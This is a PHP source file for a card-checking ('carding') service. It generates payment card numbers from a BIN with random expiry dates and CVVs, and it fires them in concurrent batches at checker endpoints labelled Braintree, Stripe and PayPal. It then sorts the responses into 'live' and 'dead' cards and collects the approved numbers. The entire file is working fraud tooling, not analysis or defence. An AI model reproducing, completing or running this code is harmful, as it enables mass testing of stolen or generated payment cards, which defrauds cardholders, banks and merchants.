<?php

class CheckCardGatewayService
{
    private const GATEWAYS = [
        '1' => [
            'name' => 'Braintree Global',
            'icon' => 'fab fa-btc',
            'path' => '/brch.php',
            'param' => 'cc',
        ],
        '2' => [
            'name' => 'Stripe Force',
            'icon' => 'fab fa-stripe',
            'path' => '/stch.php',
            'param' => 'card',
        ],
        '3' => [
            'name' => 'PayPal',
            'icon' => 'fab fa-paypal',
            'path' => '/paypal.php',
            'param' => 'card',
        ],
        '4' => [
            'name' => 'Stripe Classic',
            'icon' => 'fab fa-cc-stripe',
            'path' => '/stripe.php',
            'param' => 'card',
        ],
    ];

    private const APPROVED_WORDS = [
        'approved',
        'success',
        'charged',
        'authorized',
        'authorised',
        '3d secure',
        'live',
    ];

    private const DECLINED_WORDS = [
        'declined',
        'insufficient',
        'expired',
        'invalid',
        'generic_decline',
        'do_not_honor',
        'do not honor',
        'lost',
        'stolen',
        'fraud',
        'pickup',
        'not approved',
        'approval failed',
    ];

    public function __construct(private CheckCardCardGeneratorService $cardGenerator)
    {
    }

    public function getGateways(): array
    {
        return self::GATEWAYS;
    }

    public function getGateway(string $gateId): ?array
    {
        return self::GATEWAYS[$gateId] ?? null;
    }

    public function runBatch(int $count, array $config, array $gateway, string $baseIp): array
    {
        $multiHandle = curl_multi_init();
        $pool = [];

        for ($i = 0; $i < $count; $i++) {
            $card = $this->cardGenerator->generate(
                (string) ($config['bin'] ?? '515462'),
                (string) ($config['mm'] ?? 'RN'),
                (string) ($config['yy'] ?? 'RN'),
                (string) ($config['cvv'] ?? 'RN')
            );

            $requestUrl = $this->buildRequestUrl($baseIp, $gateway, $card);
            $handle = curl_init($requestUrl);

            curl_setopt_array($handle, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 12,
                CURLOPT_CONNECTTIMEOUT => 5,
            ]);

            curl_multi_add_handle($multiHandle, $handle);

            $pool[(int) $handle] = [
                'card' => $card,
                'handle' => $handle,
                'started_at' => microtime(true),
            ];
        }

        $running = null;

        do {
            $status = curl_multi_exec($multiHandle, $running);

            if ($running > 0) {
                $selected = curl_multi_select($multiHandle, 0.5);
                if ($selected === -1) {
                    usleep(100000);
                }
            }
        } while ($running > 0 && $status === CURLM_OK);

        $result = [
            'live' => 0,
            'dead' => 0,
            'err' => 0,
            'approved_cards' => [],
        ];

        foreach ($pool as $item) {
            $handle = $item['handle'];
            $body = (string) curl_multi_getcontent($handle);
            $parsed = $this->buildResponseResult($handle, $body);

            if ($parsed['status'] === 'APPROVED') {
                $result['live']++;
                $result['approved_cards'][] = [
                    'card' => $item['card'],
                    'msg' => $parsed['message'],
                ];
            } elseif ($parsed['status'] === 'DECLINED') {
                $result['dead']++;
            } else {
                $result['err']++;
            }



            curl_multi_remove_handle($multiHandle, $handle);
            curl_close($handle);
        }

        curl_multi_close($multiHandle);

        return $result;
    }

    private function buildRequestUrl(string $baseIp, array $gateway, string $card): string
    {
        return 'http://' . $baseIp . $gateway['path'] . '?'
            . $gateway['param'] . '=' . urlencode($card);
    }

    private function buildResponseResult($handle, string $body): array
    {
        if (curl_errno($handle)) {
            return [
                'status' => 'ERROR',
                'message' => curl_error($handle) ?: 'Transport error',
            ];
        }

        return $this->parseResponse($body);
    }

    private function parseResponse(string $body): array
    {
        $trimmed = trim($body);

        if ($trimmed === '') {
            return [
                'status' => 'ERROR',
                'message' => 'Empty response',
            ];
        }

        $decoded = json_decode($trimmed, true);

        if (is_array($decoded)) {
            return $this->parseStructuredResponse($decoded, $trimmed);
        }

        $status = $this->classifyText($trimmed);

        return [
            'status' => $status,
            'message' => $this->formatMessage($trimmed, $status),
        ];
    }

    private function parseStructuredResponse(array $payload, string $rawBody): array
    {
        foreach (['status', 'result', 'response', 'message', 'msg'] as $key) {
            if (!isset($payload[$key]) || !is_scalar($payload[$key])) {
                continue;
            }

            $candidate = trim((string) $payload[$key]);
            $status = $this->classifyText($candidate);

            if ($status !== 'ERROR') {
                return [
                    'status' => $status,
                    'message' => $this->formatMessage($candidate, $status),
                ];
            }
        }

        $flattened = $this->flattenScalarText($payload);
        $status = $this->classifyText($flattened !== '' ? $flattened : $rawBody);
        $message = $this->extractMessage($payload);

        return [
            'status' => $status,
            'message' => $this->formatMessage($message !== '' ? $message : $flattened, $status),
        ];
    }

    private function classifyText(string $text): string
    {
        $normalized = strtolower(trim($text));

        if ($normalized === '') {
            return 'ERROR';
        }

        foreach (self::DECLINED_WORDS as $word) {
            if (str_contains($normalized, $word)) {
                return 'DECLINED';
            }
        }

        foreach (self::APPROVED_WORDS as $word) {
            if (str_contains($normalized, $word)) {
                return 'APPROVED';
            }
        }

        if (preg_match('/\b(error|failed|timeout|exception)\b/i', $normalized)) {
            return 'ERROR';
        }

        return 'ERROR';
    }

    private function extractMessage(array $payload): string
    {
        foreach (['message', 'msg', 'result', 'status'] as $key) {
            if (isset($payload[$key]) && is_scalar($payload[$key])) {
                return trim((string) $payload[$key]);
            }
        }

        return '';
    }

    private function flattenScalarText(array $payload): string
    {
        $parts = [];
        array_walk_recursive($payload, static function ($value) use (&$parts): void {
            if (is_scalar($value)) {
                $parts[] = trim((string) $value);
            }
        });

        return trim(implode(' | ', array_filter($parts, static fn($part) => $part !== '')));
    }

    private function formatMessage(string $message, string $status): string
    {
        $normalized = trim($message);

        if ($normalized !== '') {
            return mb_substr($normalized, 0, 140);
        }

        return match ($status) {
            'APPROVED' => 'Approved',
            'DECLINED' => 'Declined',
            default => 'Error',
        };
    }
}
